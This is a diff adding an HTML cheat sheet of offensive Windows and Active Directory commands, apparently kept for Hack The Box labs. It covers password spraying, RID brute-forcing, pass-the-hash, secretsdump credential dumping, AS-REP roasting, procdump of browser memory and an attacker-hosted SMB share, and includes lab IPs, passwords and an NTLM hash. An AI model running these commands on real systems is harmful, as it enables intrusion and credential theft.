@@ -1,0 +1,74 @@
+<p><span style="font-size: 28px;"><strong><span style="background-color: rgb(147, 101, 184); font-family: Helvetica;">PSEXEC.py</span></strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">impacket-psexec.py username:password@ip&nbsp;</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">(you may need to add &apos; &apos; )</span></p>
+<p><br></p>
+<p><span style="font-size: 22px; font-family: Helvetica;"><strong>Connect:</strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">impacket-psexec.py username:password@ip &nbsp;</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">(you may need to add &apos; &apos; )</span></p>
+<p><span style="font-size: 28px; font-family: Helvetica;"><strong><br></strong></span></p>
+<p><span style="font-size: 28px; font-family: Helvetica;"><strong><span style="background-color: rgb(243, 121, 52);">Evil-winrm</span></strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">evil-winrm -i &lt;ip&gt; -u user -p pass&nbsp;</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">(may need to add &apos;&apos; to the pass)</span></p>
+<p><br></p>
+<p><strong><span style="font-size: 28px; background-color: rgb(209, 72, 65); font-family: Helvetica;">crackmapexec</span></strong></p>
+<p><strong><span style="font-size: 22px; font-family: Helvetica;">password spraying:</span></strong></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">crackmapexec smb &lt;ip&gt; -u users.lst -p password1 --continue-on-success</span></p>
+<p><span style="font-size: 22px;"><br></span></p>
+<p><span style="font-size: 22px;"><strong><span style="font-family: Helvetica;">connect:</span></strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">crackmapexec smb 10.129.79.75 -u c.smith -p xRxRxPANCAK3SxRxRx</span></p>
+<p><br></p>
+<p><strong><span style="font-size: 22px;">bruteforce RID:</span></strong></p>
+<p><span style="font-size: 22px;">cme smb 10.129.221.41 -u hazard -p stealth1agent --rid-brute</span></p>
+<p><br></p>
+<p><strong><span style="font-size: 22px;">Hashes: - you add the second part of the hash, and include the ":"</span></strong></p>
+<p><span style="font-size: 22px;">impacket-psexec administrator@10.129.210.78 -hashes :823452073d75b9d1cf70ebdf86c7f98e</span></p>
+<p><span style="font-size: 28px; font-family: Helvetica;"><strong><span style="background-color: rgb(71, 85, 119); color: rgb(255, 255, 255);">secretsdump.py</span></strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">secretsdump.py -just-dc-ntlm &lt;domain&gt;/&lt;username&gt;@&lt;ip&gt;&nbsp;</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">(all you need are elevated creds)</span></p>
+<p><br></p>
+<p><strong><span style="font-size: 28px; font-family: Helvetica; background-color: rgb(65, 168, 95);">smbclient</span></strong></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">smbclient -L \\\\IP address\\</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">smbclient \\\\IP address\sharename\</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">smbclient -U &lt;username&gt; \\\\ ip \sharename</span></p>
+<p><br></p>
+<p><span style="font-size: 28px; font-family: Helvetica;"><strong><span style="background-color: rgb(250, 197, 28);">smbmap</span></strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">smbmap -u user1 -p password -H &lt;ip&gt;</span></p>
+<p><br></p>
+<p><span style="font-size: 28px; font-family: Helvetica;"><span style="background-color: rgb(147, 101, 184); color: rgb(0, 0, 0);"><strong>GetNPUusers</strong></span></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;"><span style="background-color: rgb(255, 255, 255); color: rgb(0, 0, 0);">- need a user list of names which could be valid on network</span></span></p>
+<p><br></p>
+<pre><span style="font-size: 22px;">impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.129.210.78 -usersfile /home/kali/HTB_boxes/sauna/mang_user.lst -format john -no-pass </span>   </pre>
+<figure>
+    <div tabindex="0"><br></div>
+</figure>
+<p><br></p>
+<p><span style="font-size: 28px; font-family: Helvetica;"><strong><span style="background-color: rgb(243, 121, 52);">Reading certain config files</span></strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">cat &lt;filename&gt; | iconv -f UTF-16LE -t utf-8 ( there are other methods)</span></p>
+<p><br></p>
+<p><span style="font-size: 28px; background-color: rgb(44, 130, 201); color: rgb(255, 255, 255);"><strong><span style="font-family: Helvetica;">Kerbrute install and usage</span></strong></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">sudo git clone <a data-fr-linked="true" href="https://github.com/ropnop/kerbrute.git">https://github.com/ropnop/kerbrute.git</a></span></p>
+<p><span style="font-family: Helvetica;"><br></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">#### Listing compiling options</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">make help</span></p>
+<p><span style="font-family: Helvetica;"><br></span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">#### Compiling for multiple platforms and arcs</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">sudo make all</span></p>
+<p><br></p>
+<p><span style="font-size: 28px; background-color: rgb(250, 197, 28);"><strong><span style="font-family: Helvetica;">procdump</span></strong></span></p>
+<p><span style="font-size: 22px; background-color: rgb(255, 255, 255);"><span style="font-family: Helvetica;">upload procdump.exe C:\Users\Chase\Desktop\procdump.exe</span></span></p>
+<p><span style="font-size: 22px; background-color: rgb(255, 255, 255);"><span style="font-family: Helvetica;">get-process -name firefox (as you need the ID)</span></span></p>
+<p><span style="font-size: 22px; background-color: rgb(255, 255, 255);"><span style="font-family: Helvetica;">.\procdump.exe -ma 5992 firefox.dmp</span></span></p>
+<p><br></p>
+<p><span style="font-size: 28px; background-color: rgb(235, 107, 86);"><span style="font-family: Helvetica;"><strong>smbserver</strong></span></span></p>
+<pre><span style="font-family: Helvetica; font-size: 22px;">impacket-smbserver -smb2support -username guest -password guest share /home/kali/htb</span></pre>
+<p><span style="font-family: Helvetica; font-size: 28px; background-color: rgb(61, 142, 185); color: rgb(255, 255, 255);"><strong>mounting a drive</strong></span></p>
+<p><span style="font-family: Helvetica; font-size: 22px;">go to cd /mnt and create same name directories as smb dir</span></p>
+<p><span style="font-family: Helvetica; font-size: 22px;">sudo mount -t cifs //ip/sharename /mnt/sharenamecopy</span></p>
+<p><br></p>
+<p><span style="font-family: Helvetica; font-size: 22px;"><strong>with creds:</strong></span></p>
+<p><span style="font-family: Helvetica; font-size: 22px;">sudo mount -t cifs -o &apos;username=joe,password=joe1&apos; //IP/users /mnt/usernameofperson</span></p>
+<p><br></p>
+<p><br></p>
+<p><span style="font-family: Helvetica; font-size: 22px;"><strong>Winpeas to use (as .bat may not work):</strong></span></p>
+<p><span style="font-family: Helvetica; font-size: 22px;">https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe</span></p>
+<p><br></p>
